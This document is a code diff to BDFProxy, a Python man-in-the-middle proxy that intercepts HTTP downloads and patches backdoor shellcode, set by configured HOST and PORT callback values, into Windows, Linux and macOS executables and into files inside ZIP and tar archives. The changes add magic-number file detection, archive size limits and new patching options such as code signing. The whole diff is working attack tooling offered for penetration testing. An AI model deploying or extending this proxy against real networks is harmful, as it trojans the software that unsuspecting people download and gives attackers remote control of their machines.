@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 """
     BackdoorFactory Proxy (BDFProxy) v0.3 - 'W00t'
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
@@ -27,9 +27,12 @@
     POSSIBILITY OF SUCH DAMAGE.
     Tested on Kali-Linux.
 """
-
-from libmproxy import controller, proxy, platform
-from libmproxy.proxy.server import ProxyServer
+try:
+    from mitmproxy import controller, proxy, platform
+    from mitmproxy.proxy.server import ProxyServer
+except:
+    from libmproxy import controller, proxy, platform
+    from libmproxy.proxy.server import ProxyServer
 import os
 from bdf import pebin
 from bdf import elfbin
@@ -42,11 +45,10 @@ import tempfile
 import zipfile
 import tarfile
 import json
-import magic
 from contextlib import contextmanager
 from configobj import ConfigObj
 
-version = "Version: v0.3.5"
+version = "Version: v0.3.8"
 
 
 @contextmanager
@@ -157,19 +159,16 @@ class ProxyMaster(controller.Master):
     def __init__(self, srv):
         controller.Master.__init__(self, srv)
 
-        self.binaryMimeType = {'mimes': ['application/octet-stream', 'application/x-msdownload',
-                               'application/x-msdos-program', 'binary/octet-stream',
-                               'application/x-executable', 'application/x-dosexec']}
-
-        self.zipType = {'mimes': ['application/x-zip-compressed', 'application/zip'], 'params': {'type': 'ZIP', 'format': 'zip', 'filter': None}}  # .zip
-
-        self.gzType = {'mimes': ['application/gzip', 'application/x-gzip', 'application/gnutar'], 'params': {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}}  # .gz
-
-        self.tarType = {'mimes': ['application/x-tar'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': None}}  # .tar
-
-        self.bzType = {'mimes': ['application/x-bzip2', 'application/x-bzip'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': 'bzip2'}}  # .bz / .bz2
-
-        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType]
+        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
+                             'pe': {'number': 'MZ', 'offset': 0},
+                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
+                             'bz': {'number': 'BZ', 'offset': 0},
+                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
+                             'tar': {'number': 'ustar', 'offset': 257},
+                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
+                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
+                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
+                             }
 
     def run(self):
         try:
@@ -177,6 +176,12 @@ class ProxyMaster(controller.Master):
             return controller.Master.run(self)
         except KeyboardInterrupt:
             self.shutdown()
+
+    def bytes_have_format(self, bytess, formatt):
+        number = self.magicNumbers[formatt]
+        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
+            return True
+        return False
 
     def set_config(self):
         try:
@@ -190,7 +195,7 @@ class ProxyMaster(controller.Master):
 
     def set_config_archive(self, ar):
         try:
-            self.archive_type = ar['type']
+            self.archive_type = ar
             self.archive_blacklist = self.user_config[self.archive_type]['blacklist']
             self.archive_max_size = int(self.user_config[self.archive_type]['maxSize'])
             self.archive_patch_count = int(self.user_config[self.archive_type]['patchCount'])
@@ -215,20 +220,25 @@ class ProxyMaster(controller.Master):
     def inject_tar(self, aTarFileBytes, formatt=None):
         # When called will unpack and edit a Tar File and return a tar file"
 
+        if len(aTarFileBytes) > int(self.archive_max_size):
+            print "[!] TarFile over allowed size"
+            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
+            return aTarFileBytes
+
         tmp_file = tempfile.NamedTemporaryFile()
         tmp_file.write(aTarFileBytes)
         tmp_file.seek(0)
 
         compression_mode = ':'
-        if formatt == 'gzip':
+        if formatt == 'gz':
             compression_mode = ':gz'
-        if formatt == 'bzip2':
+        if formatt == 'bz':
             compression_mode = ':bz2'
 
         try:
             tar_file = tarfile.open(fileobj=tmp_file, mode='r' + compression_mode)
-        except tarfile.ReadError as ex:
-            EnhancedOutput.print_warning(ex)
+        except tarfile.ReadError:
+            EnhancedOutput.print_warning("Not a tar file!")
             tmp_file.close()
             return aTarFileBytes
 
@@ -245,22 +255,26 @@ class ProxyMaster(controller.Master):
         was_patched = False
 
         for info in members:
-            EnhancedOutput.print_info(">>> Next file in tarfile: {0}".format(info.name))
+            try:
+                EnhancedOutput.print_info(">>> Next file in tarfile: {0}".format(info.name))
 
-            if not info.isfile():
-                EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.name))
-                new_tar_file.addfile(info, tar_file.extractfile(info))
-                continue
+                if not info.isfile():
+                    EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.name))
+                    new_tar_file.addfile(info, tar_file.extractfile(info))
+                    continue
 
-            if info.size >= long(self.FileSizeMax):
-                EnhancedOutput.print_warning("{0} is too big, skipping".format(info.name))
-                new_tar_file.addfile(info, tar_file.extractfile(info))
-                continue
+                if info.size >= long(self.FileSizeMax):
+                    EnhancedOutput.print_warning("{0} is too big, skipping".format(info.name))
+                    new_tar_file.addfile(info, tar_file.extractfile(info))
+                    continue
 
-            # Check against keywords
-            if self.check_keyword(info.name.lower()) is True:
-                EnhancedOutput.print_warning("Tar blacklist enforced!")
-                EnhancedOutput.logging_info('Tar blacklist enforced on {0}'.format(info.name))
+                # Check against keywords
+                if self.check_keyword(info.name.lower()) is True:
+                    EnhancedOutput.print_warning("Tar blacklist enforced!")
+                    EnhancedOutput.logging_info('Tar blacklist enforced on {0}'.format(info.name))
+                    continue
+            except:
+                print "[!] strange formating, bailing on this file"
                 continue
 
             # Try to patch
@@ -309,6 +323,11 @@ class ProxyMaster(controller.Master):
 
     def inject_zip(self, aZipFile):
         # When called will unpack and edit a Zip File and return a zip file
+        if len(aZipFile) > int(self.archive_max_size):
+            print "[!] ZipFile over allowed size"
+            logging.info("ZipFIle maxSize met %s", len(aZipFile))
+            return aZipFile
+
         tmp_file = tempfile.NamedTemporaryFile()
         tmp_file.write(aZipFile)
         tmp_file.seek(0)
@@ -451,6 +470,9 @@ class ProxyMaster(controller.Master):
                                              ZERO_CERT=self.str2bool(self.WindowsIntelx64['ZERO_CERT']),
                                              PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower(),
                                              SUPPLIED_BINARY=self.WindowsIntelx64['SUPPLIED_BINARY'],
+                                             IDT_IN_CAVE=self.str2bool(self.WindowsIntelx64['IDT_IN_CAVE']),
+                                             CODE_SIGN=self.str2bool(self.WindowsIntelx64['CODE_SIGN']),
+                                             PREPROCESS=self.str2bool(self.WindowsIntelx64['PREPROCESS']),
                                              )
 
                     result = targetFile.run_this()
@@ -485,7 +507,10 @@ class ProxyMaster(controller.Master):
                                              ZERO_CERT=self.str2bool(self.WindowsIntelx86['ZERO_CERT']),
                                              PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower(),
                                              SUPPLIED_BINARY=self.WindowsIntelx86['SUPPLIED_BINARY'],
-                                             XP_MODE=self.str2bool(self.WindowsIntelx86['XP_MODE'])
+                                             XP_MODE=self.str2bool(self.WindowsIntelx86['XP_MODE']),
+                                             IDT_IN_CAVE=self.str2bool(self.WindowsIntelx86['IDT_IN_CAVE']),
+                                             CODE_SIGN=self.str2bool(self.WindowsIntelx86['CODE_SIGN']),
+                                             PREPROCESS=self.str2bool(self.WindowsIntelx86['PREPROCESS']),
                                              )
 
                     result = targetFile.run_this()
@@ -503,7 +528,8 @@ class ProxyMaster(controller.Master):
                                                HOST=self.LinuxIntelx86['HOST'],
                                                PORT=int(self.LinuxIntelx86['PORT']),
                                                SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
-                                               IMAGE_TYPE=self.LinuxType
+                                               IMAGE_TYPE=self.LinuxType,
+                                               PREPROCESS=self.str2bool(self.LinuxIntelx86['PREPROCESS']),
                                                )
                     result = targetFile.run_this()
                 elif targetFile.class_type == 0x2:
@@ -514,7 +540,8 @@ class ProxyMaster(controller.Master):
                                                HOST=self.LinuxIntelx64['HOST'],
                                                PORT=int(self.LinuxIntelx64['PORT']),
                                                SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
-                                               IMAGE_TYPE=self.LinuxType
+                                               IMAGE_TYPE=self.LinuxType,
+                                               PREPROCESS=self.str2bool(self.LinuxIntelx64['PREPROCESS']),
                                                )
                     result = targetFile.run_this()
 
@@ -532,7 +559,8 @@ class ProxyMaster(controller.Master):
                                                        HOST=self.MachoIntelx86['HOST'],
                                                        PORT=int(self.MachoIntelx86['PORT']),
                                                        SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
-                                                       FAT_PRIORITY=self.FatPriority
+                                                       FAT_PRIORITY=self.FatPriority,
+                                                       PREPROCESS=self.str2bool(self.MachoIntelx86['PREPROCESS']),
                                                        )
                         result = targetFile.run_this()
 
@@ -543,7 +571,8 @@ class ProxyMaster(controller.Master):
                                                        HOST=self.MachoIntelx64['HOST'],
                                                        PORT=int(self.MachoIntelx64['PORT']),
                                                        SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
-                                                       FAT_PRIORITY=self.FatPriority
+                                                       FAT_PRIORITY=self.FatPriority,
+                                                       PREPROCESS=self.str2bool(self.MachoIntelx64['PREPROCESS']),
                                                        )
                         result = targetFile.run_this()
 
@@ -554,7 +583,8 @@ class ProxyMaster(controller.Master):
                                                    HOST=self.MachoIntelx86['HOST'],
                                                    PORT=int(self.MachoIntelx86['PORT']),
                                                    SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
+                                                   FAT_PRIORITY=self.FatPriority,
+                                                   PREPROCESS=self.str2bool(self.MachoIntelx86['PREPROCESS']),
                                                    )
                     result = targetFile.run_this()
 
@@ -565,7 +595,8 @@ class ProxyMaster(controller.Master):
                                                    HOST=self.MachoIntelx64['HOST'],
                                                    PORT=int(self.MachoIntelx64['PORT']),
                                                    SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
+                                                   FAT_PRIORITY=self.FatPriority,
+                                                   PREPROCESS=self.str2bool(self.MachoIntelx64['PREPROCESS']),
                                                    )
                     result = targetFile.run_this()
 
@@ -661,6 +692,7 @@ class ProxyMaster(controller.Master):
                     setattr(self, key, value)
                     EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(key, value))
 
+    '''
     def inject(self, flow):
         EnhancedOutput.print_size(flow)
 
@@ -677,6 +709,7 @@ class ProxyMaster(controller.Master):
             buf = self.inject_tar(flow, self.archive_params['filter'])
 
         return buf
+    '''
 
     def handle_request(self, flow):
         print "*" * 10, "REQUEST", "*" * 10
@@ -705,6 +738,9 @@ class ProxyMaster(controller.Master):
         # Blacklists have the final say, but everything starts off as not patchable
         # until a rule says True. Host whitelist over rides keyword whitelist.
 
+        # Fail safe.. rules must set it to true.
+        self.patchIT = False
+
         self.hosts_whitelist_check(flow)
         self.keys_whitelist_check(flow)
         self.keys_backlist_check(flow)
@@ -722,9 +758,15 @@ class ProxyMaster(controller.Master):
 
             flow.reply()
         else:
-            mime_type = magic.from_buffer(flow.reply.obj.response.content, mime=True)
+            if self.bytes_have_format(flow.reply.obj.response.content, 'zip') and self.str2bool(self.CompressedFiles) is True:
+                    aZipFile = flow.reply.obj.response.content
+                    self.set_config_archive('ZIP')
+                    flow.reply.obj.response.content = self.inject_zip(aZipFile)
 
-            if mime_type in self.binaryMimeType['mimes']:
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf') or \
+                    self.bytes_have_format(flow.reply.obj.response.content, 'fatfile') or self.bytes_have_format(flow.reply.obj.response.content, 'machox86') or \
+                    self.bytes_have_format(flow.reply.obj.response.content, 'machox64'):
+
                 tmp = tempfile.NamedTemporaryFile()
                 tmp.write(flow.reply.obj.response.content)
                 tmp.flush()
@@ -746,17 +788,19 @@ class ProxyMaster(controller.Master):
                     EnhancedOutput.logging_info("Patching failed for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
 
                 # add_try to delete here
-                
+
                 tmp.close()
-            else:
-                for archive in self.archiveTypes:
-                    if mime_type in archive['mimes'] and self.str2bool(self.CompressedFiles) is True:
-                        try:
-                            self.set_config_archive(archive['params'])
-                            flow.reply.obj.response.content = self.inject(flow.reply.obj.response.content)
-                        except Exception as exc:
-                            EnhancedOutput.print_error(exc)
-                            EnhancedOutput.print_warning("Returning original file")
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'gz') and self.str2bool(self.CompressedFiles) is True:
+                # assume .tar.gz for now
+                self.set_config_archive('TAR')
+                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'gz')
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'bz') and self.str2bool(self.CompressedFiles) is True:
+                # assume .tar.bz for now
+                self.set_config_archive('TAR')
+                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'bz')
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'tar') and self.str2bool(self.CompressedFiles) is True:
+                self.set_config_archive('TAR')
+                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'tar')
 
             flow.reply()
 
@@ -833,7 +877,7 @@ except Exception as e:
 EnhancedOutput.print_info("Starting BDFProxy")
 EnhancedOutput.print_info(version)
 EnhancedOutput.print_info("Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com")
-EnhancedOutput.logging_info("################ Starting BDFProxy-ng ################")
+EnhancedOutput.logging_info("################ Starting BDFProxy ################")
 
 EnhancedOutput.logging_info("ConfigDump {0}".format(json.dumps(user_config, sort_keys=True, indent=4)))
 m.run()
